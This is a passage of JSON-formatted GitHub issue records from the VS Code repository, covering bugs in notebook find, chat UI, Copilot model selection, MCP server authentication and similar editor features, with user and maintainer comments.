{"repo": "microsoft/vscode", "issue_number": 235762, "issue_url": "https://github.com/microsoft/vscode/issues/235762", "issue_title": "keybindings to \"find\" next/previous occurences not working ?", "issue_author": "vimchun", "issue_body": "### Applies To\n\n- [X] Notebooks (.ipynb files)\n- [ ] Interactive Window and\\/or Cell Scripts (.py files with \\#%% markers)\n\n### What happened?\n\nHi, I can use my keybindings on a classic file (ie a python file) to find the next/previous occurence of the string defined on the find widget (the one appearing on the top right inputbox). That's working well using : \r\n```\r\n    { \"key\": \"ctrl+n\", \"command\": \"editor.action.nextMatchFindAction\"},\r\n    { \"key\": \"ctrl+p\", \"command\": \"editor.action.previousMatchFindAction\"},\r\n```\r\n\r\nTherefore, it does not seem working on a notebook file. I can see with the \"Keyboard Shortcuts Troubleshooting\", that these commands are well triggered, but I cannot see the next/previous occurence focused.\r\n\r\nAre these commands supposed to work on notebooks ?\r\nIf not, which commands should I use ?\r\n\r\nThanks in advance, I am trying to have a config where I use the mouse as least possible.\n\n### VS Code Version\n\n1.89.1\n\n### Jupyter Extension Version\n\nv2024.4.0\n\n### Jupyter logs\n\n_No response_\n\n### Coding Language and Runtime Version\n\n_No response_\n\n### Language Extension Version (if applicable)\n\n_No response_\n\n### Anaconda Version (if applicable)\n\n_No response_\n\n### Running Jupyter locally or remotely?\n\nNone", "issue_labels": ["bug", "notebook-cell-editor", "notebook-find"], "comments": [{"author": "oscu0", "body": "I have the same issue."}, {"author": "huangyxi", "body": "The same thing happens on macOS. (with \u2318G, \u21e7\u2318G)"}, {"author": "rebornix", "body": "This is implemented via https://github.com/microsoft/vscode/pull/270303"}]}
{"repo": "microsoft/vscode", "issue_number": 239826, "issue_url": "https://github.com/microsoft/vscode/issues/239826", "issue_title": "when I delete a terminal, there's a link disposable leaked", "issue_author": "meganrogge", "issue_body": "<img width=\"677\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/c365d74a-b585-4142-9ff0-59991e9a7e8a\" />", "issue_labels": ["bug", "debt", "*duplicate", "terminal-links"], "comments": [{"author": "anthonykim1", "body": "Closing as duplicate. \n\n/duplicate"}]}
{"repo": "microsoft/vscode", "issue_number": 262269, "issue_url": "https://github.com/microsoft/vscode/issues/262269", "issue_title": "Buttons in picker title are cramped", "issue_author": "bpasero", "issue_body": "I feel they miss some margin to separate from each other:\n\n<img width=\"904\" height=\"105\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/75110476-ce67-45ce-bd30-e045a2ae19a4\" />\n\nSee how in the background the buttons in the editor toolbar have more spacing.", "issue_labels": ["bug", "verified", "polish", "quick-pick", "insiders-released"], "comments": [{"author": "TylerLeonhardt", "body": "The difficulty here is that I've seen quick picks in the wild that have like 10 buttons.\n\nI remember @eamodio's GitLens having a few quick picks that were up there.\n\nSo the padding would need to be somewhat dynamic to be smaller when there are many so that it doesn't cover the title"}, {"author": "eamodio", "body": "I believe we have 4 icons max, if that helps."}, {"author": "TylerLeonhardt", "body": "Oh! Ok maybe we can just do this statically and if folks complain then do something different."}]}
{"repo": "microsoft/vscode", "issue_number": 259382, "issue_url": "https://github.com/microsoft/vscode/issues/259382", "issue_title": "caps lock issue", "issue_author": "Mahidhar001", "issue_body": "\nType: <b>Bug</b>\n\nin vs-code the caps lock button is on but not working .i am running it in linux on chromebook. \n\nVS Code version: Code 1.102.3 (488a1f239235055e34e673291fb8d8c810886f81, 2025-07-29T03:00:23.339Z)\nOS version: Linux x64 6.6.76-08174-g2f3b34fb3650\nModes:\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|Intel(R) Core(TM) i5-2520M CPU @ 2.50GHz (4 x 0)|\n|GPU Status|2d_canvas: unavailable_software<br>canvas_oop_rasterization: disabled_off<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: disabled_software<br>multiple_raster_threads: enabled_on<br>opengl: disabled_off<br>rasterization: disabled_software<br>raw_draw: disabled_off_ok<br>skia_graphite: disabled_off<br>video_decode: disabled_software<br>video_encode: disabled_software<br>vulkan: disabled_off<br>webgl: unavailable_software<br>webgl2: unavailable_software<br>webgpu: disabled_off<br>webnn: unavailable_software|\n|Load (avg)|1, 1, 1|\n|Memory (System)|2.70GB (1.45GB free)|\n|Process Argv|--crash-reporter-id e401fb5b-bab0-41f8-92b8-c4ea2dc9ebec|\n|Screen Reader|no|\n|VM|100%|\n|DESKTOP_SESSION|undefined|\n|XDG_CURRENT_DESKTOP|X-Generic|\n|XDG_SESSION_DESKTOP|undefined|\n|XDG_SESSION_TYPE|wayland|\n</details><details><summary>Extensions (11)</summary>\n\nExtension|Author (truncated)|Version\n---|---|---\nvscode-tailwindcss|bra|0.14.26\ncopilot|Git|1.350.0\ncopilot-chat|Git|0.29.1\ndebugpy|ms-|2025.10.0\npython|ms-|2025.10.1\nvscode-pylance|ms-|2025.7.1\nvscode-python-envs|ms-|1.2.0\ncmake-tools|ms-|1.21.36\ncpptools|ms-|1.26.3\ncpptools-extension-pack|ms-|1.3.1\nvscode-typescript-next|ms-|6.0.20250802\n\n(1 theme extensions excluded)\n\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368cf:30146710\nbinariesv615:30325510\n2e7ec940:31000449\nnativeloc1:31344060\ndwcopilot:31170013\n6074i472:31201624\ndwoutputs:31242946\ncopilot_t_ci:31333650\ne5gg6876:31282496\npythoneinst12:31285622\nc7cif404:31314491\n996jf627:31283433\npythonrdcb7:31342333\nusemplatestapi:31297334\n0aa6g176:31307128\n747dc170:31275177\n6518g693:31334701\naj953862:31281341\ngeneratesymbolt:31295002\nconvertfstringf:31295003\npylancequickfixt:31358882\n9d2cg352:31346308\nconvertlamdaf:31358879\nusemarketplace:31343026\nnesew2to5:31336538\nagentclaude:31352135\nnes-diff-11:31337487\nreplacestringexc:31350595\nnes-set-on:31351930\nonetestforazureexp:31335613\n6abeh943:31336334\nenvsdeactivate2:31353495\nyijiwantestdri0626-c:31336931\n0927b901:31350571\nf76d9909:31348711\n45650338:31358607\n0cj2b977:31352657\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "editor-input"], "comments": [{"author": "amunger", "body": "Do you mean that the text you type is not capitalized with caps lock on, but it is capitalized in other editors? "}, {"author": "Mahidhar001", "body": "yes.\r\n\r\nOn Mon, Aug 4, 2025 at 9:02\u202fPM Aaron Munger ***@***.***>\r\nwrote:\r\n\r\n> *amunger* left a comment (microsoft/vscode#259382)\r\n> <https://github.com/microsoft/vscode/issues/259382#issuecomment-3151257145>\r\n>\r\n> Do you mean that the text you type is not capitalized with caps lock on,\r\n> but it is capitalized in other editors?\r\n>\r\n> \u2014\r\n> Reply to this email directly, view it on GitHub\r\n> <https://github.com/microsoft/vscode/issues/259382#issuecomment-3151257145>,\r\n> or unsubscribe\r\n> <https://github.com/notifications/unsubscribe-auth/BTONI63DMHGJIGPKHUHUYGT3L54I3AVCNFSM6AAAAACC7K2O32VHI2DSMVQWIX3LMV43OSLTON2WKQ3PNVWWK3TUHMZTCNJRGI2TOMJUGU>\r\n> .\r\n> You are receiving this because you authored the thread.Message ID:\r\n> ***@***.***>\r\n>\r\n"}, {"author": "amunger", "body": "is this only for the editor area, or for other input areas like quick open (ctrl+p), terminal, extension search field?"}, {"author": "Mahidhar001", "body": "all input areas\r\n\r\nOn Mon, Aug 4, 2025 at 10:46\u202fPM Aaron Munger ***@***.***>\r\nwrote:\r\n\r\n> *amunger* left a comment (microsoft/vscode#259382)\r\n> <https://github.com/microsoft/vscode/issues/259382#issuecomment-3151680121>\r\n>\r\n> is this only for the editor area, or for other input areas like quick open\r\n> (ctrl+p), terminal, extension search field?\r\n>\r\n> \u2014\r\n> Reply to this email directly, view it on GitHub\r\n> <https://github.com/microsoft/vscode/issues/259382#issuecomment-3151680121>,\r\n> or unsubscribe\r\n> <https://github.com/notifications/unsubscribe-auth/BTONI6ZX6GDYHBTVC4GJWML3L6IOVAVCNFSM6AAAAACC7K2O32VHI2DSMVQWIX3LMV43OSLTON2WKQ3PNVWWK3TUHMZTCNJRGY4DAMJSGE>\r\n> .\r\n> You are receiving this because you authored the thread.Message ID:\r\n> ***@***.***>\r\n>\r\n"}, {"author": "imbrem", "body": "I'm having the same issue; any updates?"}]}
{"repo": "microsoft/vscode", "issue_number": 260021, "issue_url": "https://github.com/microsoft/vscode/issues/260021", "issue_title": "Response Window Does Not Wrap Long Lines in Copilot Chat", "issue_author": "biscuit-0", "issue_body": "**Open Chat in New window**\n\nhttps://github.com/user-attachments/assets/d5cd491a-ddee-46c8-9714-387655867ed1\n\n**Bug Description:**\nWhen Copilot responds with lengthy content, the response window does not automatically wrap long lines. As a result, much of the content extends beyond the visible area, and users must scroll horizontally to view the entire response. This makes it difficult to read and interact with long outputs.\n\n**Expected Behavior:**\nThe response window should automatically wrap long lines so that all content remains visible without requiring horizontal scrolling.\n\n**Steps to Reproduce:**\n1. Trigger Copilot to generate a long response in the VS Code extension.\n2. Observe that the response window does not wrap text, and horizontal scrolling is required to view the full content.\n\n**Environment:**\n\n- VS Code version: 1.102.3\n- Copilot Chat Extension Version: 0.29.1\n- Copilot extension version: 1.350.0\n- OS: Windows 11\n\nThank you!", "issue_labels": ["bug"], "comments": [{"author": "justschen", "body": "i suspect this is because of the language. we'll take a look, thanks!"}, {"author": "megamorphg", "body": "> i suspect this is because of the language\n\nI have this happening with AutoHotkey code too, so I think it's also programming language specific\n\nEdit: nevermind! I had the Chat > Editor: Word Wrap set to off!"}]}
{"repo": "microsoft/vscode", "issue_number": 262744, "issue_url": "https://github.com/microsoft/vscode/issues/262744", "issue_title": "Copilot states that its name is \"github copilot\" repeatedly", "issue_author": "ulikoehler", "issue_body": "\nType: <b>Bug</b>\n\nExample outputs:\n\"Name: GitHub Copilot\"\n\"Small note: My name is GitHub Copilot.\"\n\nWith GPT-5 mini (not sure about other models), at the end of responses, Copilot often (~20% of prompts) states that its name is github copilot, without being prompted. It's always right at the end of the output.\n\nExample context:\n\n```\n[...]\nRun full build/test (npm run build / run unit tests) in your environment to verify integration \u2014 I ran static checks only. If you want, I can run the build and tests now.\nIf you'd like me to proceed to convert the remaining non-HTTP reason occurrences, or run a full build/tests, tell me which and I'll continue.\n\nName: GitHub Copilot\n```\n\nLatest prompt which generated that output:\n```\nStandardize on the body field being \"message\", convert every \"reason\" to \"message\" and remove the parameter\n```\n\nExtension version: 0.30.1\nVS Code version: Code 1.103.1 (360a4e4fd251bfce169a4ddf857c7d25d1ad40da, 2025-08-12T16:25:40.542Z)\nOS version: Linux x64 6.8.0-71-generic\nModes:\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz (8 x 3699)|\n|GPU Status|2d_canvas: enabled<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: disabled_off<br>trees_in_viz: disabled_off<br>video_decode: enabled<br>video_encode: disabled_software<br>vulkan: disabled_off<br>webgl: enabled<br>webgl2: enabled<br>webgpu: disabled_off<br>webnn: disabled_off|\n|Load (avg)|6, 5, 4|\n|Memory (System)|31.14GB (15.57GB free)|\n|Process Argv|SpiroFitUI --crash-reporter-id c0183266-25a4-4c97-9350-cfaff581072f|\n|Screen Reader|no|\n|VM|4%|\n|DESKTOP_SESSION|plasma|\n|XDG_CURRENT_DESKTOP|KDE|\n|XDG_SESSION_DESKTOP|KDE|\n|XDG_SESSION_TYPE|x11|\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368:30146709\nbinariesv615:30325510\nnativeloc1:31344060\ndwcopilot:31170013\ndwoutputs:31242946\ncopilot_t_ci:31333650\ne5gg6876:31282496\npythoneinst12:31285622\n996jf627:31283433\npythonrdcb7:31342333\nusemplatestapi:31297334\n747dc170:31275177\n6518g693:31334701\naj953862:31281341\n9d2cg352:31346308\nnesew2to5:31336538\nagentclaude:31350858\nnes-set-on:31351930\n6abeh943:31336334\nenvsdeactivate2:31353495\n0927b901:31350571\nf76d9909:31348711\ncustommodel2t:31371781\n45650338:31358607\n0cj2b977:31352657\njusteven_python:31371804\ngaj49834:31362110\nasdad:31365766\nretryenabled:31370050\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "verified"], "comments": [{"author": "kpripper", "body": "I confirm \u2014 Copilot starts every single message by introducing itself!!!!\n\"My name is GitHub Copilot.\"\n\nI\u2019ve already told it a hundred times not to do that and even wrote it in .github/copilot-instructions.md!"}, {"author": "bhavyaus", "body": "Does this happen with gpt-5* ?"}, {"author": "kpripper", "body": "> Does this happen with gpt-5* ?\n\nYes"}, {"author": "bhavyaus", "body": "Thanks. This issue has been fixed in the latest insiders and should be available in the next release. "}]}
{"repo": "microsoft/vscode", "issue_number": 257529, "issue_url": "https://github.com/microsoft/vscode/issues/257529", "issue_title": "Issue Reporter no longer opens a draft issue", "issue_author": "juliasilge", "issue_body": "\nType: <b>Bug</b>\n\nIn older versions of VS Code, the in-product issue reporter (Help > Report Issue) opened a _draft issue_, but now this flow opens just a regular issue, not in a draft state where you can edit before posting. The previous behavior was great because it allowed folks to preview and edit their issue before submitting. The instructions in the in-product issue reporter also state:\n\n> You will be able to edit your issue and add screenshots when we preview it on GitHub.\n\nThis is no longer true, as the button no longer opens a draft issue.\n\nVS Code version: Code 1.102.2 (c306e94f98122556ca081f527b466015e1bc37b0, 2025-07-22T12:15:48.520Z)\nOS version: Darwin arm64 24.5.0\nModes:\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|Apple M1 (8 x 2400)|\n|GPU Status|2d_canvas: enabled<br>canvas_oop_rasterization: enabled_on<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: enabled_on<br>video_decode: enabled<br>video_encode: enabled<br>webgl: enabled<br>webgl2: enabled<br>webgpu: enabled<br>webnn: disabled_off|\n|Load (avg)|2, 3, 5|\n|Memory (System)|16.00GB (0.38GB free)|\n|Process Argv|--crash-reporter-id 525192d5-314f-459b-ac86-bdf65193e863|\n|Screen Reader|no|\n|VM|0%|\n</details><details><summary>Extensions (44)</summary>\n\nExtension|Author (truncated)|Version\n---|---|---\nruff|cha|2025.24.0\nvscode-eslint|dba|3.0.10\ndocker|doc|0.13.0\npython-environment-manager|don|1.2.7\ngitlens|eam|17.3.2\nEditorConfig|Edi|0.17.4\nprettier-vscode|esb|11.0.0\ncopilot|Git|1.346.0\ncopilot-chat|Git|0.29.1\nvscode-github-actions|git|0.27.2\nvscode-pull-request-github|Git|0.114.3\nvscode-pr-pinger|jri|0.0.6\nvscode-format-context-menu|lac|1.0.4\nvscode-containers|ms-|2.1.0\nvscode-docker|ms-|2.0.0\npyright|ms-|1.1.403\nblack-formatter|ms-|2025.2.0\ndebugpy|ms-|2025.10.0\nflake8|ms-|2025.2.0\nisort|ms-|2025.0.0\npython|ms-|2025.10.1\nvscode-pylance|ms-|2025.6.2\nvscode-python-envs|ms-|1.0.0\ndatawrangler|ms-|1.22.0\njupyter|ms-|2025.6.0\njupyter-keymap|ms-|1.1.2\njupyter-renderers|ms-|1.3.0\nvscode-jupyter-cell-tags|ms-|0.1.9\nvscode-jupyter-slideshow|ms-|0.1.6\nremote-containers|ms-|0.422.1\nextension-test-runner|ms-|0.0.12\nvscode-github-issue-notebooks|ms-|0.0.133\nvscode-selfhost-test-provider|ms-|0.3.25\nindent-rainbow|ode|8.3.1\nair-vscode|Pos|0.14.0\nshiny|Pos|1.3.0\nquarto|qua|1.123.0\nr|REd|2.8.6\nr-syntax|REd|0.1.3\nrust-analyzer|rus|0.3.2547\neven-better-toml|tam|0.21.2\nvscode-lldb|vad|1.11.5\nvscode-selfhost-test-provider|ms-|0.4.0\nvscode-selfhost-import-aid|ms-|0.0.1\n\n(2 theme extensions excluded)\n\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368cf:30146710\nvswsl492cf:30256860\nbinariesv615:30325510\n14424c2-chatv6:31345185\n2e7ec940:31000449\nnativeloc1:31344060\ndwcopilot:31170013\n6074i472:31201624\ndwoutputs:31242946\nhdaa2157:31222309\ncopilot_t_ci:31333650\ne5gg6876:31282496\npythoneinst12:31285622\nc7cif404:31314491\npythonpulldiag:31343502\n996jf627:31283433\npythonrdcb7:31342333\nusemplatestapi:31297334\n0aa6g176:31307128\n747dc170:31275177\n6518g693:31334701\naj953862:31281341\ngeneratesymbolt:31295002\nconvertfstringf:31295003\npylancequickfixf:31350060\n9d2cg352:31346308\nusemarketplace:31343026\nnesew2to5:31336538\nagentclaude:31335814\nnes-diff-11:31337487\nreplacestringexc:31350595\nnes-set-on:31340697\n6abeh943:31336334\nenvsactivate1:31353494\nyijiwantestdri0626-c:31336931\n0927b901:31350571\nji9b5146:31348712\n45650338:31351948\n0cj2b977:31352657\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "verified", "issue-reporter", "insiders-released"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 262937, "issue_url": "https://github.com/microsoft/vscode/issues/262937", "issue_title": "Chat: Tasks list UI has z-index that is too high", "issue_author": "hawkticehurst", "issue_body": "<!-- \u26a0\ufe0f\u26a0\ufe0f Do Not Delete This! bug_report_template \u26a0\ufe0f\u26a0\ufe0f -->\n<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->\n<!-- \ud83d\udd6e Read our guide about submitting issues: https://github.com/microsoft/vscode/wiki/Submitting-Bugs-and-Suggestions -->\n<!-- \ud83d\udd0e Search existing issues to avoid creating duplicates. -->\n<!-- \ud83e\uddea Test using the latest Insiders build to see if your issue has already been fixed: https://code.visualstudio.com/insiders/ -->\n<!-- \ud83d\udca1 Instead of creating your report here, use 'Report Issue' from the 'Help' menu in VS Code to pre-fill useful information. -->\n<!-- \ud83d\udd27 Launch with `code --disable-extensions` to check. -->\n\nSeeing an issue where the chat task list UI will be rendered above type / doc hovers when it shouldn't be.\n\nDoes this issue occur when all extensions are disabled?: Yes\n\n<!-- \ud83e\ude93 If you answered No above, use 'Help: Start Extension Bisect' from Command Palette to try to identify the cause. -->\n<!-- \ud83d\udce3 Issues caused by an extension need to be reported directly to the extension publisher. The 'Help > Report Issue' dialog can assist with this. -->\n\nSteps to Reproduce:\n\n1. Open/start Chat that includes a task list\n2. Make sure task list is expanded \n3. Open a JS or TS file\n4. Hover over a line of code at the top of the file to get type / doc information\n5. See that it's hidden underneath task list\n\n<img width=\"828\" height=\"250\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/aa6ebe29-008f-4bca-90a8-a5b60f067ea2\" />\n\nVersion: 1.104.0-insider\nCommit: d2edee24762a3923e2422d3f61528ae4b1381a33\nDate: 2025-08-20T06:50:12.030Z (2 days ago)\nElectron: 37.2.3\nElectronBuildId: 12035395\nChromium: 138.0.7204.100\nNode.js: 22.17.0\nV8: 13.8.500258-electron.0\nOS: Darwin arm64 24.6.0\\", "issue_labels": ["bug", "verified"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 263414, "issue_url": "https://github.com/microsoft/vscode/issues/263414", "issue_title": "Chat: Changing font size should relayout chat view", "issue_author": "joaomoreno", "issue_body": "1. Have an existing chat view\n2. Increate chat font to something like 26\n\n\ud83d\udc1b Chat messages are likely vertically cropped. The view fixes itself once you horizontally resize it.\n\nhttps://github.com/user-attachments/assets/c4c55376-79a1-4b3d-abde-666503649291", "issue_labels": ["bug", "verified", "insiders-released", "chat"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 240139, "issue_url": "https://github.com/microsoft/vscode/issues/240139", "issue_title": "Terminal suggest: fig generator completions often complain about the executable not existing", "issue_author": "Tyriar", "issue_body": "Eg. `npm global remove |` will fail with npm ENOENT", "issue_labels": ["bug", "windows", "terminal-suggest"], "comments": [{"author": "meganrogge", "body": "I see a different error \ud83d\udc1b \n\n![Image](https://github.com/user-attachments/assets/c34fb75b-0ba3-405e-9b62-700e202f63b5)"}, {"author": "Tyriar", "body": "@meganrogge that's what i see now for this repro too"}, {"author": "meganrogge", "body": "I'm not seeing an error anymore... possible this was fixed?"}, {"author": "meganrogge", "body": "<img width=\"624\" height=\"427\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/f320d378-a4e2-408b-bcb5-3271785e000f\" />"}]}
{"repo": "microsoft/vscode", "issue_number": 268027, "issue_url": "https://github.com/microsoft/vscode/issues/268027", "issue_title": "Previously configured models are stuck now that manage models isn't available to business users", "issue_author": "caiohsramos", "issue_body": "\nType: <b>Bug</b>\n\nThe models selected in v103 cannot be changed in v104, meaning I can only use a subset of the available models. There should be a \"Manage Models...\" options according to https://code.visualstudio.com/docs/copilot/customization/language-models#_change-the-model-for-chat-conversations.\n\n<img width=\"399\" height=\"286\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/b466ba78-0a8c-405c-9311-ec4f8cb2e959\" />\n\nVS Code version: Code 1.104.1 (Universal) (0f0d87fa9e96c856c5212fc86db137ac0d783365, 2025-09-17T23:36:24.973Z)\nOS version: Darwin arm64 24.6.0\nModes:\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|Apple M1 Pro (10 x 2400)|\n|GPU Status|2d_canvas: enabled<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: enabled_on<br>trees_in_viz: disabled_off<br>video_decode: enabled<br>video_encode: enabled<br>webgl: enabled<br>webgl2: enabled<br>webgpu: enabled<br>webnn: disabled_off|\n|Load (avg)|3, 2, 2|\n|Memory (System)|16.00GB (0.06GB free)|\n|Process Argv|--crash-reporter-id 9dea0469-44b6-4cf5-a53c-a4b7109a8526|\n|Screen Reader|no|\n|VM|0%|\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368cf:30146710\nbinariesv615:30325510\nnativeloc1:31344060\ndwcopilot:31170013\ndwoutputs:31242946\ncopilot_t_ci:31333650\ne5gg6876:31282496\n996jf627:31283433\npythonrdcb7:31342333\nusemplatestapi:31297334\naj953862:31281341\nnesew2to5:31336538\ncs4_fixed:31388788\nnes-set-on:31351930\nonetestforazureexpcf:31335614\n6abeh943:31336334\naa_t:31379598\n0cj2b977:31352657\n0574c672:31362109\ncloudbuttont:31379625\ntodos-1:31390405\nmultireplacestringcontrol:31387919\ncontrol_gpt5applypatchexclusively:31387916\n3efgi100_wstrepl:31382709\nmetis-embeddings:31388492\ntrigger-command-fix:31379601\n56b7f661:31389394\nuse-responses-api:31390855\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "verified", "candidate", "model-byok"], "comments": [{"author": "avegao", "body": "Same here\n\n```\nVersion: 1.104.1\nCommit: 0f0d87fa9e96c856c5212fc86db137ac0d783365\nDate: 2025-09-17T23:36:24.973Z\nElectron: 37.3.1\nElectronBuildId: 12404162\nChromium: 138.0.7204.235\nNode.js: 22.18.0\nV8: 13.8.258.31-electron.0\nOS: Darwin arm64 25.0.0\ngithub.copilot-chat: 0.31.2\n```"}, {"author": "skyisle", "body": "I think it's because #260955"}, {"author": "caiohsramos", "body": "Business/enterprise users should _at least_ be able to manage Copilot provided models. Unless there's a way to restore access to all Copilot models. Right now, I'm only able to use the models I've previously selected in v103."}, {"author": "arisona", "body": "As pointed out by @skyisle , this indeed seems to be on purpose for business users. I was able to restore to the default set of models by deleting globalStorage/state.vscdb. Not nice, but worked."}, {"author": "architjain798", "body": "I'm also facing the same issue. It's still not fixed, even in VS Code Insiders."}, {"author": "caiohsramos", "body": "As @arisona pointed out, it's possible to restore the models by manually changing globalStorage/state.vscdb with sqlite3:\n```sql\nDELETE from ItemTable where key = 'chatModelPickerPreferences';\n```"}, {"author": "mjbvz", "body": "Closing for verification as fix was merged "}, {"author": "mikehdt", "body": "I don't mind not being able to configure new models / MCP servers if my work doesn't allow, that's fine, but shouldn't I be able to hide models I don't want to use?\n\nFeels like a sledgehammer was used where a chisel was needed."}, {"author": "lramos15", "body": "> but shouldn't I be able to hide models I don't want to use?\n\nI completely agree, but unfortunately the way our implementation works both of these flow through the same API surface so gating one without the other is quite difficult. Instead we just hope to open up the entire model management feature to Copilot Business and Copilot enterprise soon. This is something we actively continuely to think about and may create a special case for the Copilot models"}]}
{"repo": "microsoft/vscode", "issue_number": 263216, "issue_url": "https://github.com/microsoft/vscode/issues/263216", "issue_title": "Chat editor stops coloring code after window reload", "issue_author": "bpasero", "issue_body": "Steps to Reproduce:\n\n1. move a Chat session into the editor that has code\n2. reload window\n\n=> \ud83d\udc1b code is no longer colored\n\n<img width=\"968\" height=\"727\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/c033e75f-94fe-4180-87db-114a0e06de6a\" />\n", "issue_labels": ["bug", "insiders-released", "papercut :drop_of_blood:", "workbench-copilot", "chat-editor"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 263400, "issue_url": "https://github.com/microsoft/vscode/issues/263400", "issue_title": "Copilot search showing double results", "issue_author": "MominRaza", "issue_body": "<!-- Please search existing issues to avoid creating duplicates -->\n<!-- Please attach logs to help us diagnose your issue -->\n\n- Copilot Chat Extension Version: 0.30.3(stable) and 0.31.2025082601(Insider)\n- VS Code Version: 1.103.2 and 1.104.0-insider\n- OS Version: Windows 11\n- Feature (e.g. agent/edit/ask mode): agent mode\n- Selected model (e.g. GPT 4.1, Claude 3.7 Sonnet): GPT 4.1\n- Logs:\n\nSteps to Reproduce:\n\n1. Ask copilot to find a file\n\n<img width=\"558\" height=\"145\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/8d9afa55-941d-4512-87ec-8c8ff9a9ca1b\" />\n\nIt should only show one match found but showing 2 matches for on file, I have noticed similar behavior when copilot searching for files in folder.\n\nHere I reproduced it in Insiders\n\n<img width=\"936\" height=\"523\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/15053bca-e8aa-43a3-930f-4540d06ba43f\" />", "issue_labels": ["bug", "insiders-released", "chat-agent"], "comments": [{"author": "roblourens", "body": "I see an issue with findFiles2, thanks https://github.com/microsoft/vscode/issues/263911"}, {"author": "rebornix", "body": "Fixed via https://github.com/microsoft/vscode/pull/270460"}]}
{"repo": "microsoft/vscode", "issue_number": 265988, "issue_url": "https://github.com/microsoft/vscode/issues/265988", "issue_title": "Copilot Chat uses Azure MCP Server despite extension being disabled", "issue_author": "waldekmastykarz", "issue_body": "I've got the Azure MCP Server VSCode extension installed but disabled. I also have no additional MCP Servers installed. After submitting a prompt to GitHub Copilot Chat I see that it's using the Azure MCP Server despite it being disabled.\n\n<img width=\"3638\" height=\"3054\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/ec5e5ab2-2b0c-481a-a2a9-859b67c74609\" />\n\nVSCode:\n\nVersion: 1.103.2\nCommit: 6f17636121051a53c88d3e605c491d22af2ba755\nDate: 2025-08-20T16:45:34.255Z\nElectron: 37.2.3\nElectronBuildId: 12035395\nChromium: 138.0.7204.100\nNode.js: 22.17.0\nV8: 13.8.500258-electron.0\nOS: Darwin arm64 24.6.0\n\n- Copilot Chat Extension Version: 0.30.3\n- Feature (e.g. agent/edit/ask mode): agent\n- Selected model (e.g. GPT 4.1, Claude 3.7 Sonnet): Claude Sonnet 4\n\nSteps to Reproduce:\n\n1. Install the GitHub Copilot for Azure extension\n2. Disable globally all extensions except GitHub Copilot and GitHub Copilot Chat\n3. Submit a prompt that would trigger the Azure MCP Server, such as _get best practices about building apps on Azure_\n", "issue_labels": ["bug", "insiders-released", "chat-mcp"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 269593, "issue_url": "https://github.com/microsoft/vscode/issues/269593", "issue_title": "MCP Server www-authenticate auth urls", "issue_author": "wolfpackt99", "issue_body": "> im facing a very similar issue. my /mcp implementation returns a WWW-Authenticate header in response to a 401 on the /mcp address.\n> ```\n> OnChallenge = context =>\n> {\n>     var prmUrl = $\"{serverUrl}/.well-known/oauth-protected-resource\";\n>     // Prevent redirect/challenge - just return 401\n>     context.HandleResponse();\n>     context.Response.StatusCode = StatusCodes.Status401Unauthorized;\n>     context.Response.Headers.Append(\"WWW-Authenticate\", $\"Bearer realm=\\\"MCP\\\", resource_metadata=\\\"{prmUrl}\\\"\");\n>     return context.Response.WriteAsync(\"Unauthorized\");\n> }\n> ```\n> the .well-known endpoint returns the correct info in the setup of resourcedata including the correct auth servers but vscode just uses the `{serverUrl}` as its base address to make the authorize call on. In my case localhost:8081/authorize\n> \n> the flow all seems to work, except not adhering to the returned `authorization_servers`\n> \n> resource response:\n> ```\n> {\n>     \"resource\": \"https://localhost:8081/mcp\",\n>     \"authorization_servers\": [\n>         \"https://my-auth-server/auth\"\n>     ],\n>     \"bearer_methods_supported\": [\n>         \"header\"\n>     ],\n>     \"scopes_supported\": [\n>         \"<the-scope>\",\n>     ],\n>     \"resource_documentation\": \"https://docs.my-mcp.com\"\n> }\n> ```\n> \n> https://modelcontextprotocol.io/specification/draft/basic/authorization#authorization-flow-steps\n> the spec and the diagram provided suggests it should be parsing the metadata and extracting the authorization servers \n\n _Originally posted by @wolfpackt99 in [#268880](https://github.com/microsoft/vscode/issues/268880#issuecomment-3362007771)_", "issue_labels": ["bug", "authentication", "insiders-released", "chat-mcp"], "comments": [{"author": "wolfpackt99", "body": "here are the logs. However, i think i understand whats going on. The client is looking for a endpoint that doesn't exist on my auth server according to 